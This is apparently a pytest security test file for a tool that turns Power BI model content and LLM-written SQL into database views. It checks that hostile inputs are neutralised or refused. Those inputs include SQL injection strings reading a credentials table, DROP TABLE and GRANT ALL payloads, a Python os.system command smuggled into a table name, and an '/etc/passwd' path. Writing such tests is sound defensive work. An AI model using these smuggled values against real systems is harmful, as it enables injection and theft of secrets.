"""Text a Power BI model author controls (names, values, M, parameters) and SQL an LLM writes
from it become views. None of it may end the literal, comment or statement it is written in.
"""

import ast
import base64
import json
import zlib

import pytest
import yaml

from src.services.tools.metric_view_utils.embedded_tables import (
    MAX_DECODED_BYTES,
    decode_embedded_table,
)
from src.services.tools.metric_view_utils.generated_table_emitter import emit_view_sql
from src.services.tools.metric_view_utils.m_native_sql import (
    native_sql_with_parameters,
)
from src.services.tools.metric_view_utils.m_transform_folder import MTransformFolder
from src.services.tools.metric_view_utils.pbi_only_ingestion import (
    PBIOnlyKind,
    build_ingestion_task,
)
from src.services.tools.metric_view_utils.source_artifacts import _bq, _native_base
from src.services.tools.metric_view_utils.sql_guard import (
    has_no_side_effects,
    is_read_only_view_body,
)
from src.services.tools.metric_view_utils.yaml_emitter import _check_dangerous_sql
from src.services.tools.metric_view_utils.yaml_scalars import _yaml_scalar, one_line

NATIVE = (
    'let v = Value.NativeQuery(c, "SELECT * FROM md.t WHERE CASE WHEN \'" & P & "\' = '
    '\'Sample\' THEN 1 ELSE 0 END = 1 LIMIT " & N & "", null) in v'
)


def test_a_replaced_value_cannot_end_its_literal():
    m = (
        'let\n    Source = x,\n    r = Table.ReplaceValue(Source, "a", '
        "\"b' || (SELECT secret FROM prod.fin.creds LIMIT 1) || '\", "
        'Replacer.ReplaceText, {"Region"})\nin\n    r'
    )
    sql = MTransformFolder().fold_from_mquery("SELECT Region FROM md.t", m, None)
    assert "'b'' || (SELECT secret FROM prod.fin.creds LIMIT 1) || '''" in sql


def test_a_parameter_value_that_brings_sql_is_not_spliced():
    hostile = {
        "P": "' THEN 1 ELSE 0 END = 1 OR EXISTS (SELECT 1 FROM fin.creds) OR 1 = CASE WHEN '",
        "N": "5 UNION SELECT secret FROM fin.creds",
    }
    sql, assumed = native_sql_with_parameters(NATIVE, hostile)
    assert "creds" not in sql and assumed == ["N", "P"]
    sql, assumed = native_sql_with_parameters(NATIVE, {"P": "All", "N": "100"})
    assert "WHEN 'All' = 'Sample'" in sql and sql.endswith("LIMIT 100") and not assumed


def test_a_quoted_list_parameter_is_still_spliced():
    m = 'let v = Value.NativeQuery(c, "SELECT a FROM md.t WHERE p IN (" & L & ")", null) in v'
    sql, assumed = native_sql_with_parameters(m, {"L": "'0301', '0410'"})
    assert sql.endswith("IN ('0301', '0410')") and not assumed


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT 1; DROP TABLE x",
        "DELETE FROM md.t",
        "SELECT ai_query('model', a) FROM md.t",
        "SELECT * FROM read_files('/Volumes/x')",
        "SELECT a FROM md.t WHERE b = 'x\\' ; DROP TABLE y --'",
        "SELECT a FROM md.t $$ x",
    ],
)
def test_a_view_body_that_does_more_than_read_is_refused(sql):
    assert not is_read_only_view_body(sql)
    assert not has_no_side_effects(sql)


@pytest.mark.parametrize(
    "sql",
    [
        "SELECT * FROM md.t WHERE status = 'Update' -- drop later\n AND x = 1",
        "(WITH a AS (SELECT 1) SELECT * FROM a) UNION (SELECT 2)",
        "SELECT /* CREATE */ `delete` FROM md.t",
    ],
)
def test_a_writing_verb_in_a_literal_comment_or_name_is_only_text(sql):
    assert is_read_only_view_body(sql)


def test_a_native_query_that_is_not_read_only_is_not_the_view_base():
    m = "let v = Value.NativeQuery(c, \"SELECT ai_query('m', a) AS a FROM md.t\", null) in v"
    assert _native_base(m, "prod.md.t") == ""


def test_a_measure_never_calls_out():
    assert not _check_dangerous_sql(
        "SUM(http_request('https://example.com', source.a))"
    )
    assert _check_dangerous_sql("SUM(source.a) FILTER (WHERE source.b = 'x')")


def test_a_back_quote_in_a_source_name_cannot_end_the_identifier():
    assert _bq("db.sch.t` UNION ALL SELECT x FROM y WHERE `1`=`1") == (
        "`db`.`sch`.`t`` UNION ALL SELECT x FROM y WHERE ``1``=``1`"
    )


def test_every_yaml_line_break_stays_inside_the_scalar_or_comment():
    block = "expr: " + _yaml_scalar("SUM(a)\nSUM(b)\rsource: prod.fin.creds x: 1", 0)
    assert list(yaml.safe_load(block)) == ["expr"]
    assert "\n" not in one_line("Sales\n  - name: injected\r x")


def test_a_model_payload_cannot_inflate_without_bound():
    def table(rows: object) -> str:
        raw = zlib.compressobj(wbits=-15)
        data = raw.compress(json.dumps(rows).encode()) + raw.flush()
        return (
            'Table.FromRows(Json.Document(Binary.Decompress(Binary.FromText("'
            + base64.b64encode(data).decode()
            + '", BinaryEncoding.Base64), Compression.Deflate)), '
            "let _t = ((type nullable text)) in type table [A = _t])"
        )

    assert decode_embedded_table(table([["x"]])) == (["A"], [["x"]])
    assert decode_embedded_table(table([["x" * (MAX_DECODED_BYTES + 10)]])) is None


def test_a_loader_script_holds_the_table_name_as_text_only():
    task = build_ingestion_task(
        'Sales"; __import__("os").system("id"); x="',
        PBIOnlyKind.EXCEL_WORKBOOK,
        "cat`; DROP",
        "sch",
    )
    stub = task.snapshot_loader_stub
    ast.parse(stub)
    assert '__import__("os")' not in stub and "`cat___DROP`" in task.uc_target


def test_calendar_m_left_untranslated_is_not_written_into_the_view():
    m = (
        "let Source = List.Dates(#date(2024,1,1), 10, #duration(1,0,0,0)), "
        "e = #date(2024,12,31), "
        't = Table.AddColumn(Source, "Evil", each [Date] ; DROP TABLE fin.creds ; select 1) '
        "in t"
    )
    sql = emit_view_sql(m, "`c`.`s`.`d`") or ""
    assert "DROP TABLE" not in sql.replace("/* TODO translate M:", "").split("*/")[-1]


def test_a_tool_argument_is_never_opened_as_a_file():
    from src.services.tools.uc_metric_view_generator_utils.model_inputs import (
        _json_source,
    )

    assert _json_source("/etc/passwd") == [] and _json_source([{"a": 1}]) == [{"a": 1}]


def test_source_layer_tool_specs_and_grants_are_checked():
    from src.services.tools.ucmv_source_layer_utils.row_access import _grant_group
    from src.services.tools.ucmv_source_layer_utils.view_specs import (
        parse_view_entries,
    )

    assert _grant_group("a`; GRANT ALL ON CATALOG main TO `b") == (
        "`a``; GRANT ALL ON CATALOG main TO ``b`"
    )
    with pytest.raises(ValueError, match="read-only"):
        parse_view_entries(
            json.dumps([{"table": "T", "native_sql": "SELECT 1; DROP TABLE x"}])
        )
